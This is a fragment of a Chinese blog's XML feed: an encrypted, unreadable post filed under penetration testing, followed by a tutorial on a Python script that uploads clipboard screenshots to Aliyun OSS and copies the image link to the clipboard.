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
</div>
<script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>parrot</tag>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>阿里云OSS智能上传图床</title>
    <url>/2018/06/13/%E9%98%BF%E9%87%8C%E4%BA%91OSS%E5%82%A8%E5%AD%98%E6%99%BA%E8%83%BD%E4%B8%8A%E4%BC%A0%E5%9B%BE%E5%BA%8A/</url>
    <content><![CDATA[<blockquote>
<p>背景：由于现在云储存的发展，许多东西储存到云端更加方便，比如：图片；网上最多的工具就是七牛云以及上传利用工具，但是七牛云需要手持身份证实名认证，所以放弃；其次没有关注腾讯云，所以选择了阿里云，其实优惠力度还是腾讯的比较大；为了避免麻烦，就没有在做迁移了，使用过的可以与阿里云关联的极简图床，但是我们还是需要一张张的拖图片，然后复制makedown连接，这样还是太麻烦了，有一天看到大佬写了一个腾讯云的工具，所以，在学习之余写了这个工具。</p>
</blockquote>
<h2 id="程序流程图如下："><a href="#程序流程图如下：" class="headerlink" title="程序流程图如下："></a>程序流程图如下：</h2><p><img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-27/77366569.jpg" alt></p>
<h2 id="功能实现"><a href="#功能实现" class="headerlink" title="功能实现"></a>功能实现</h2><h3 id="图片截图以后，从粘贴板获取图片保存到本地Image文件夹下"><a href="#图片截图以后，从粘贴板获取图片保存到本地Image文件夹下" class="headerlink" title="图片截图以后，从粘贴板获取图片保存到本地Image文件夹下"></a>图片截图以后，从粘贴板获取图片保存到本地Image文件夹下</h3><ul>
<li><p>使用win32clipboard，win32con，PIL模块</p>
</li>
<li><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> win32con</span><br><span class="line"><span class="keyword">import</span> win32clipboard <span class="keyword">as</span> w</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> ImageGrab</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br></pre></td></tr></table></figure>
</li>
</ul>
<ul>
<li><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">im = ImageGrab.grabclipboard()      <span class="comment">#从粘贴板获取内容</span></span><br><span class="line">        <span class="keyword">if</span> isinstance(im,Image.Image):      <span class="comment">#判断是不是图片</span></span><br><span class="line">            name = str(time.time()) + <span class="string">".png"</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>获取到图片以后判断是否为图片然后保存到本地</p>
</li>
<li><p>这里说明一点：PIL模块是处理图像的，使用PIL处理过图像以后是使图像变小，有利于进行云储存</p>
</li>
</ul>
<h3 id="将图片上传以后的生成的访问地址添加到粘贴板"><a href="#将图片上传以后的生成的访问地址添加到粘贴板" class="headerlink" title="将图片上传以后的生成的访问地址添加到粘贴板"></a>将图片上传以后的生成的访问地址添加到粘贴板</h3><ul>
<li><p>使用win32clipboard，win32con模块</p>
</li>
<li><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setText</span><span class="params">(self,aString)</span>:</span></span><br><span class="line">        w.OpenClipboard()</span><br><span class="line">        w.EmptyClipboard()</span><br><span class="line">        w.SetClipboardData(win32con.CF_TEXT,aString)</span><br><span class="line">        w.CloseClipboard()</span><br></pre></td></tr></table></figure>
</li>
<li><p>这里存在一个坑：win32con.CF_TEXT这里在Python2中会将所有的字符串添加到粘贴板，早Python3中只会添加首个字符，解决办法：将CF_TEXT替换为CF_UNICODETEXT，如果在Python2中使用CF_UNICODETEXT会出现添加到粘贴板的字符是乱码</p>
</li>
</ul>
<h3 id="上传图片到OSS"><a href="#上传图片到OSS" class="headerlink" title="上传图片到OSS"></a>上传图片到OSS</h3><ul>
<li><p>使用oss2、shutil 模块，oss2是官方提供的Python OSS SDK，支持Python2、3</p>
</li>
<li><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span><span class="params">(self,file_name,name)</span>:</span></span><br><span class="line">        bucket = oss2.Bucket(oss2.Auth(self.acc_id,self.acc_secret),self.endpoint,self.bucket_name)</span><br><span class="line">        data = bucket.put_object_from_file(key=<span class="string">'Blog/'</span>+ name,filename=<span class="string">'image/'</span>+ name, headers=<span class="keyword">None</span>, progress_callback=<span class="keyword">None</span>)</span><br><span class="line">        str = <span class="string">"https://xxxxxx.xx/"</span> + name</span><br><span class="line"> </span><br><span class="line">          shutil.rmtree(<span class="string">'image'</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>这里要在外部的 config文件中配置好阿里云提供的：Access Key ID、Access Key Secret、bucket_name、endpoint</p>
</li>
<li>说明：由于阿里云的SDK默认不支持文件夹，目录的概念，所以通过添加’/‘来表示在那个文件夹下；又由于没有返回文件访问连接地址的接口，所以通过固有的形式进行组合</li>
<li>shutil模块进行清空本地存放已经上传完的的图片（这样会删除文件夹，比遍历更加快速），这一点看个人了，可有可无，也可以使用os模块进行相应的操作。</li>
</ul>
<h3 id="设置阿里云OSS的接口信息"><a href="#设置阿里云OSS的接口信息" class="headerlink" title="设置阿里云OSS的接口信息"></a>设置阿里云OSS的接口信息</h3><ul>
<li><p>通过外部的config文件导入<img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-27/76961318.jpg" alt></p>
</li>
<li><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">        infoDict = &#123;&#125;</span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">"config.conf"</span>,<span class="string">"r"</span>) <span class="keyword">as</span> file:</span><br><span class="line">            ApiInfo = file.readlines()</span><br><span class="line">            <span class="keyword">for</span> info <span class="keyword">in</span> ApiInfo:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="keyword">if</span> info != <span class="string">"\n"</span> <span class="keyword">and</span> info != <span class="string">""</span>:</span><br><span class="line">                        tmp = info.split(<span class="string">"="</span>)</span><br><span class="line">                        infoDict[tmp[<span class="number">0</span>].strip()] = tmp[<span class="number">1</span>].strip()</span><br><span class="line">                <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">u"[-] 请按照要求配置config.conf"</span></span><br><span class="line">                    sys.exit()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">u"[-] 请在config.conf中配置阿里云 API信息"</span></span><br><span class="line">        sys.exit()</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="结果示例"><a href="#结果示例" class="headerlink" title="结果示例"></a>结果示例</h3><ul>
<li><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1522318333.02.png" alt></li>
<li><img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-27/38823279.jpg" alt></li>
</ul>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><ul>
<li>[OSS SDK-Python]:<a href="https://github.com/aliyun/aliyun-oss-python-sdk" target="_blank" rel="noopener">https://github.com/aliyun/aliyun-oss-python-sdk</a></li>
</ul>
<h3 id="更新说明"><a href="#更新说明" class="headerlink" title="更新说明"></a>更新说明</h3><blockquote>
<p>现在已经修改可以支持python3的环境，详情请看github</p>
</blockquote>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>编程</tag>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
